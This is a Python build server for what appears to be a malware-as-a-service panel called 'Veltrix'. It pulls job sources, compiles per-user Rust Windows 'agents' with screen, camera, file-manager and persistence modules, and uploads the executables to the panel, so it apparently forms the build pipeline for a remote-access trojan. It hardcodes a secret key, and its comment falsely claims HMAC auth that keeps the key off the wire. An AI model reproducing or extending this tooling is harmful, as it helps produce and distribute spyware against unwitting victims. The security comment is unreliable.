#!/usr/bin/env python3
"""
Veltrix Build Server
-----------------------
Connects to the Veltrix panel, polls for build jobs, compiles Rust agents,
and uploads the resulting .exe back to the panel.

Usage:
    python3 app.py                          # uses defaults
    python3 app.py --url https://your-panel.com --key YOUR_BUILDER_KEY

Requires: requests, cargo + x86_64-pc-windows-gnu target installed.
"""

import argparse
import hashlib
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

try:
    import requests
except ImportError:
    print("[!] 'requests' not installed. Run: pip install requests")
    sys.exit(1)

# ── Config ──────────────────────────────────────────────────────────────────

DEFAULT_URL = "http://localhost:3001"
DEFAULT_KEY = "hc-builder-f7a92c3d1e8b4506"   # must match BUILDER_KEY in server.js
POLL_INTERVAL = 5        # seconds between polls
SOURCES_DIR = Path(__file__).parent / "rustagent_src"
BUILDS_DIR = Path(__file__).parent / "builds"

# ── Helpers ─────────────────────────────────────────────────────────────────

def log(level: str, msg: str):
    ts = time.strftime("%H:%M:%S")
    symbols = {"info": "*", "ok": "+", "err": "!", "warn": "~"}
    print(f"[{ts}] [{symbols.get(level, '*')}] {msg}")


def auth_headers(key: str) -> dict:
    """Compute HMAC-based auth header so the raw key never travels in plain text."""
    ts = str(int(time.time()))
    sig = hashlib.sha256(f"{key}:{ts}".encode()).hexdigest()
    return {
        "X-Builder-Key": key,
        "X-Builder-Ts": ts,
        "X-Builder-Sig": sig,
    }


class BuildServer:
    def __init__(self, panel_url: str, builder_key: str):
        self.url = panel_url.rstrip("/")
        self.key = builder_key
        self.session = requests.Session()
        self.session.headers.update(auth_headers(self.key))
        SOURCES_DIR.mkdir(parents=True, exist_ok=True)
        BUILDS_DIR.mkdir(parents=True, exist_ok=True)

    # ── Source sync ─────────────────────────────────────────────────────────

    def sync_sources(self):
        """Download rustagent source files from the panel (if newer)."""
        log("info", "Syncing agent source files...")
        try:
            r = self.session.get(f"{self.url}/api/builder/sources", headers=auth_headers(self.key), timeout=30)
            if r.status_code != 200:
                log("err", f"Source sync failed: {r.status_code} {r.text[:200]}")
                return False
            data = r.json()
            if not data.get("ok"):
                log("err", f"Source sync error: {data.get('error', 'unknown')}")
                return False
            files = data.get("files", {})
            changed = 0
            for name, content in files.items():
                dest = SOURCES_DIR / name
                # Only write if content changed
                existing = dest.read_text() if dest.exists() else ""
                if existing != content:
                    dest.write_text(content)
                    changed += 1
                    log("info", f"  Updated: {name}")
            log("ok", f"Source sync complete — {changed} file(s) updated, {len(files)} total")
            return True
        except Exception as e:
            log("err", f"Source sync exception: {e}")
            return False

    # ── Poll for jobs ───────────────────────────────────────────────────────

    def poll(self) -> dict | None:
        """Poll the panel for the next queued build job."""
        try:
            r = self.session.get(f"{self.url}/api/builder/poll", headers=auth_headers(self.key), timeout=15)
            if r.status_code == 204:
                return None  # no jobs
            if r.status_code != 200:
                log("warn", f"Poll error: {r.status_code}")
                return None
            data = r.json()
            if data.get("ok") and data.get("job"):
                return data["job"]
            return None
        except Exception as e:
            log("err", f"Poll exception: {e}")
            return None

    # ── Build ───────────────────────────────────────────────────────────────

    def compile(self, job: dict) -> tuple[bool, str, str | None]:
        """
        Compile a Rust agent from the job's source files.
        Returns (success, message, exe_path_or_none).
        """
        build_id = job["buildId"]
        username = job["username"]
        build_name = job["buildName"]
        sources = job["sources"]  # dict of filename -> content

        build_dir = BUILDS_DIR / f"{username}_{build_id}"
        src_dir = build_dir / "src"
        src_dir.mkdir(parents=True, exist_ok=True)

        log("info", f"Building #{build_id} '{build_name}' for {username}...")

        try:
            # Write generated main.rs + Cargo.toml
            for name, content in sources.items():
                (build_dir / name if name == "Cargo.toml" else src_dir / name).write_text(content)

            # Copy base module files from synced sources
            for mod_file in ["screen.rs", "camera.rs", "filemanager.rs", "persistence.rs"]:
                src_path = SOURCES_DIR / mod_file
                if src_path.exists():
                    shutil.copy2(src_path, src_dir / mod_file)

            # Run cargo build
            log("info", f"  cargo build --release --target x86_64-pc-windows-gnu ...")
            result = subprocess.run(
                ["cargo", "build", "--release", "--target", "x86_64-pc-windows-gnu"],
                cwd=str(build_dir),
                capture_output=True,
                text=True,
                timeout=600,
            )

            if result.returncode != 0:
                err_msg = result.stderr[-500:] if result.stderr else "Unknown error"
                log("err", f"  Compilation failed: {err_msg[:200]}")
                return False, err_msg, None

            # Find exe
            exe_path = build_dir / "target" / "x86_64-pc-windows-gnu" / "release" / f"{build_name}.exe"
            if not exe_path.exists():
                return False, "EXE not found after compilation", None

            log("ok", f"  Compiled: {exe_path.name} ({exe_path.stat().st_size} bytes)")
            return True, "OK", str(exe_path)

        except subprocess.TimeoutExpired:
            return False, "Build timed out (10 min)", None
        except Exception as e:
            return False, str(e), None

    # ── Upload result ───────────────────────────────────────────────────────

    def upload_result(self, build_id: int, success: bool, exe_path: str | None, error_msg: str = ""):
        """Upload compiled exe (or failure) back to the panel."""
        try:
            if success and exe_path and os.path.exists(exe_path):
                with open(exe_path, "rb") as f:
                    r = self.session.post(
                        f"{self.url}/api/builder/complete/{build_id}",
                        headers=auth_headers(self.key),
                        files={"exe": (os.path.basename(exe_path), f, "application/octet-stream")},
                        data={"status": "compiled"},
                        timeout=120,
                    )
            else:
                r = self.session.post(
                    f"{self.url}/api/builder/complete/{build_id}",
                    headers=auth_headers(self.key),
                    json={"status": "failed", "error": error_msg[:500]},
                    timeout=30,
                )
            if r.status_code == 200:
                log("ok", f"  Result uploaded for build #{build_id}")
            else:
                log("err", f"  Upload failed: {r.status_code} {r.text[:200]}")
        except Exception as e:
            log("err", f"  Upload exception: {e}")

    # ── Cleanup ─────────────────────────────────────────────────────────────

    def cleanup(self, job: dict):
        build_dir = BUILDS_DIR / f"{job['username']}_{job['buildId']}"
        try:
            shutil.rmtree(build_dir, ignore_errors=True)
        except:
            pass

    # ── Main loop ───────────────────────────────────────────────────────────

    def run(self):
        log("info", f"Veltrix Build Server starting")
        log("info", f"Panel: {self.url}")
        log("info", f"Poll interval: {POLL_INTERVAL}s")
        print()

        # Initial source sync
        if not self.sync_sources():
            log("warn", "Could not sync sources on startup — will retry later")

        last_sync = time.time()

        while True:
            try:
                # Re-sync sources every 5 minutes
                if time.time() - last_sync > 300:
                    self.sync_sources()
                    last_sync = time.time()

                job = self.poll()
                if job:
                    log("info", f"New job: #{job['buildId']} — {job['buildName']} for {job['username']}")
                    success, msg, exe_path = self.compile(job)
                    self.upload_result(job["buildId"], success, exe_path, msg)
                    self.cleanup(job)
                else:
                    pass  # no job, wait

            except KeyboardInterrupt:
                log("info", "Shutting down.")
                break
            except Exception as e:
                log("err", f"Loop error: {e}")

            time.sleep(POLL_INTERVAL)


# ── Entry point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Veltrix Build Server")
    parser.add_argument("--url", default=os.environ.get("HC_PANEL_URL", DEFAULT_URL),
                        help="Panel URL (default: %(default)s)")
    parser.add_argument("--key", default=os.environ.get("HC_BUILDER_KEY", DEFAULT_KEY),
                        help="Builder secret key (default: from env or built-in)")
    parser.add_argument("--interval", type=int, default=POLL_INTERVAL,
                        help="Poll interval in seconds (default: %(default)s)")
    args = parser.parse_args()

    POLL_INTERVAL = args.interval
    server = BuildServer(args.url, args.key)
    server.run()
